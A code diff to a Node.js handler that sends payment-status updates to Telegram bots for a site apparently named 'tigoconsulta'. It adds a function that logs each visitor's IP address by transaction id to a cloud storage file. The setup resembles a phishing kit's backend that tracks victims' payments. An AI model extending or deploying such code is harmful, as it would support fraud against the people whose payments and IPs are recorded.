@@ -1,4 +1,16 @@
 require('dotenv').config();
+const AWS = require('aws-sdk');
+
+const s3 = new AWS.S3({
+    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
+    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
+    endpoint: process.env.R2_ENDPOINT,
+    s3ForcePathStyle: true,
+    signatureVersion: 'v4',
+    region: 'auto'
+});
+
+const BUCKET = process.env.R2_BUCKET;
 
 async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
     try {
@@ -23,6 +35,47 @@ const estadoMensajes = {
     'pago-exitoso': '✅ <b>ESTADO: Pago Completado</b>',
     'pago-cancelado': '❌ <b>ESTADO: Pago Cancelado</b>'
 };
+
+async function guardarIPenDatos(txid, ip) {
+    try {
+        const data = await new Promise((resolve, reject) => {
+            s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
+                if (err) resolve('');
+                else resolve(data.Body.toString());
+            });
+        });
+
+        let lineas = data.split('\n').filter(l => l.trim());
+        let encontrado = false;
+
+        lineas = lineas.map(linea => {
+            try {
+                const obj = JSON.parse(linea);
+                if (obj.txid === txid) {
+                    obj.ip = ip;
+                    encontrado = true;
+                    return JSON.stringify(obj);
+                }
+            } catch (e) {}
+            return linea;
+        });
+
+        if (!encontrado) {
+            lineas.push(JSON.stringify({ txid, ip, timestamp: new Date().toISOString() }));
+        }
+
+        const newContent = lineas.join('\n');
+
+        await new Promise((resolve, reject) => {
+            s3.putObject({ Bucket: BUCKET, Key: 'datos_consultas.txt', Body: newContent }, (err) => {
+                if (err) reject(err);
+                else resolve();
+            });
+        });
+    } catch (error) {
+        console.error('Error guardando IP:', error);
+    }
+}
 
 async function enviarEstadoTelegram(txid, referencia, pagina, ip) {
     try {
@@ -60,7 +113,10 @@ module.exports = async (req, res) => {
 
         const clientIp = ip || req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';
 
-        await enviarEstadoTelegram(txid, referencia, pagina, clientIp);
+        await Promise.all([
+            enviarEstadoTelegram(txid, referencia, pagina, clientIp),
+            guardarIPenDatos(txid, clientIp)
+        ]);
 
         return res.status(200).json({ ok: true, message: 'Estado enviado a Telegram' });
     } catch (error) {
